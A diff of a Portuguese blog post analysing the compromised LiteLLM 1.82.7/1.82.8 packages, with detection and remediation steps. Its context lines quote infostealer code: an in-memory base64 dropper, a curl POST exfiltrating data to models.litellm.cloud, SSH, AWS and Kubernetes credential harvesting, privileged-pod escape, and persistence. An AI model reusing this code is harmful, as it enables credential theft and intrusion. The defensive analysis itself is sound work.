@@ -57,7 +57,6 @@ Post do Snyk (o mais técnico/com código que achei).
 O ponto de entrada foram duas versões do pacote LiteLLM v1.82.7 e v1.82.8. Ele é o 1o Estágio, vulgo Dropper. Sua única responsabilidade é executar o infostealer, que coleta os dados, sem (muitos) deixar rastros, cifrar o resultado e exfiltrá-lo.
 
 ### Execução em memória
-
 ```python
 payload = base64.b64decode(B64_SCRIPT)
 subprocess.run([sys.executable, "-"], input=payload, stdout=f, stderr=subprocess.DEVNULL, check=True)
@@ -66,7 +65,6 @@ subprocess.run([sys.executable, "-"], input=payload, stdout=f, stderr=subprocess
 O Dropper faz o parsing do Base64 na variável B64_SCRIPT, o infostealer é decodificado e enviado via stdin para o interpretador Python e **nunca toca o disco.** Toda a saída (credenciais, arquivos, outputs de comandos) é capturada no stdout e salva num diretório temporário que é destruído automaticamente ao final. 
 
 ### Envelope criptográfico híbrido
-
 ```python
 # 1. Gera chave de sessão AES aleatória
 subprocess.run(["openssl", "rand", "-out", sk, "32"])
@@ -86,7 +84,6 @@ subprocess.run(["tar", "-czf", "tpcp.tar.gz", "payload.enc", "session.key.enc"])
 Implementação de criptografia híbrida: AES para os dados (eficiente), RSA para a chave (assimétrico). Sem a chave privada do atacante, os dados capturados são (matematicamente) inacessíveis. A chave pública RSA-4096 está hardcoded no inicio do script.
 
 ### Exfiltração disfarçada
-
 ```python
 subprocess.run([
     "curl", "-s", "-X", "POST", "https://models.litellm.cloud/",
@@ -105,7 +102,6 @@ O domínio `litellm.cloud` imita o projeto open source legítimo LiteLLM (proxy 
 Esse é o script embutido em `B64_SCRIPT`. Roda inteiramente em memória, escreve tudo no stdout, e nunca levanta exceções visíveis — cada bloco tem `except: pass` ou `except OSError: pass`.
 
 ### Reconhecimento inicial
-
 ```python
 run('hostname; pwd; whoami; uname -a; ip addr 2>/dev/null || ifconfig 2>/dev/null; ip route 2>/dev/null')
 run('printenv')
@@ -116,7 +112,6 @@ Primeira coisa executada: Fingerprint completo da máquina incluindo **todas as 
 ---
 
 ### Fase 1: Chaves SSH e credenciais Git
-
 ```python
 # Chaves do usuário — todos os tipos conhecidos
 for f in ['/.ssh/id_rsa','/.ssh/id_ed25519','/.ssh/id_ecdsa','/.ssh/id_dsa',
@@ -131,12 +126,11 @@ walk(['/etc/ssh'], 1, lambda fp,fn: fn.startswith('ssh_host') and fn.endswith('_
 for f in ['/.git-credentials', '/.gitconfig']: emit(h+f)
 ```
 
-As chaves de host do servidor (`/etc/ssh/ssh_host_*_key`) permitem impersonar o servidor em ataques MITM futuros. O `~/.git-credentials` armazena tokens do GitHub/GitLab em plain text quando o credential helper é `store`.
+As chaves de host do servidor (`/etc/ssh/ssh_host_*_key`) permitem impersonar o servidor em ataques AitM (Adversary in the Middle) futuros. O `~/.git-credentials` armazena tokens do GitHub/GitLab em plain text quando o credential helper é `store`.
 
 ---
 
 ### Fase 2: AWS — quatro vetores simultâneos
-
 ```python
 # Vetor 1: arquivos locais
 emit(h+'/.aws/credentials')
@@ -181,7 +175,6 @@ ssm = aws_req('POST', 'ssm', REG, '/', 'Action=DescribeParameters&Version=2014-1
 ---
 
 ### Fase 3: Kubernetes — coleta + escalação de privilégios
-
 ```python
 # Service account token montado automaticamente em pods
 emit('/var/run/secrets/kubernetes.io/serviceaccount/token')
@@ -200,7 +193,6 @@ Qualquer pod com service account que tenha permissão de leitura em secrets cons
 ---
 
 ### Fase 4: Varredura ampla do filesystem
-
 Tudo em paralelo, via `walk()` recursivo com profundidade configurável:
 
 ```python
@@ -250,7 +242,6 @@ O `all_roots` cobre `/home/*/`, `/root`, `/opt`, `/srv`, `/var/www`, `/app`, `/d
 ---
 
 ### Fase 5: Persistência no cluster Kubernetes
-
 Com o service account token, o script lista todos os nós do cluster e para **cada nó** cria um pod privilegiado em `kube-system`:
 
 ```python
@@ -284,7 +275,6 @@ chroot /host systemctl enable --now sysmon.service
 ---
 
 ### Fase 6: Persistência local (fallback)
-
 Se não estiver em ambiente K8s, instala diretamente na máquina:
 
 ```python
@@ -375,7 +365,6 @@ O `start_new_session=True` é crítico: mesmo que o `sysmon.service` seja parado
 O payload executa no momento em que o Python carrega o pacote — **inclusive durante o próprio `pip install`**. Se você instalou 1.82.7 ou 1.82.8, não basta fazer upgrade. O código já pode ter rodado.
 
 ### Passo 1: Verificar a versão instalada
-
 ```bash
 pip show litellm | grep Version
 ```
@@ -383,7 +372,6 @@ pip show litellm | grep Version
 Se o output mostrar `1.82.7` ou `1.82.8`, trate o sistema como comprometido e siga os passos abaixo antes de qualquer outra ação.
 
 ### Passo 2: Verificar artefatos de persistência
-
 ```bash
 # Backdoor do sysmon
 ls -la ~/.config/sysmon/sysmon.py 2>/dev/null && echo "BACKDOOR FOUND"
@@ -399,7 +387,6 @@ ls /tmp/tpcp.tar.gz /tmp/session.key /tmp/payload.enc /tmp/session.key.enc 2>/de
 ```
 
 ### Passo 3: Verificar arquivos .pth maliciosos
-
 O mecanismo de entrega na versão 1.82.8 usa um arquivo `.pth` em `site-packages` — que o Python executa automaticamente na inicialização do interpretador, antes de qualquer código da aplicação:
 
 ```bash
@@ -410,7 +397,6 @@ find $(python3 -c "import site; print(' '.join(site.getsitepackages()))") \
 Qualquer resultado é suspeito. Arquivos `.pth` legítimos contêm apenas caminhos de diretório.
 
 ### Passo 4: Verificar hashes dos arquivos
-
 ```bash
 # proxy_server.py — versão 1.82.7
 find / -path "*/litellm/proxy/proxy_server.py" 2>/dev/null -exec shasum -a 256 {} \;
@@ -422,7 +408,6 @@ find / -name "litellm_init.pth" 2>/dev/null -exec shasum -a 256 {} \;
 ```
 
 ### Passo 5: Verificar indicadores de rede
-
 ```bash
 grep "litellm.cloud\|checkmarx.zone" /etc/hosts
 grep "models.litellm.cloud\|checkmarx.zone" /var/log/syslog 2>/dev/null
@@ -431,7 +416,6 @@ grep "models.litellm.cloud\|checkmarx.zone" /var/log/syslog 2>/dev/null
 Presença de `checkmarx.zone` em logs de DNS ou proxy nos últimos 30-90 dias indica que o C2 agent já estava ativo — e a janela de comprometimento começa na data mais antiga encontrada.
 
 ### Passo 6: Verificar Kubernetes
-
 ```bash
 kubectl get pods -A | grep "node-setup-"
 ```
@@ -443,7 +427,6 @@ Pods com esse padrão de nome em `kube-system` são o container escape instalado
 ## Remediação
 
 ### Se você NÃO instalou 1.82.7 ou 1.82.8
-
 Fixe a versão imediatamente antes que algum processo automatizado instale:
 
 ```bash
@@ -456,7 +439,6 @@ litellm<=1.82.6
 ```
 
 ### Se você instalou 1.82.7 ou 1.82.8
-
 Trate o sistema como potencialmente comprometido independente de ter executado código da aplicação. **O payload roda durante o `pip install`.**
 
 **1. Eliminar persistência**
@@ -681,5 +663,7 @@ Conexões para `checkmarx.zone` e `litellm.cloud` nos últimos 30-90 dias indica
 Nós K8s comprometidos não são confiáveis após container escape. A única garantia é recriar as instâncias a partir de imagens conhecidamente limpas.
 
 ---
-
-Shouts para o mano [Vdgonc](https://github.com/Vdgonc)
+  
+Shouts para:  
+- pro mano [Vdgonc](https://github.com/Vdgonc) pelas conversas.  
+- pro mano [Manoelito Filho](https://www.linkedin.com/in/manoelitofilho/) pelo apontamento no Texto ;).
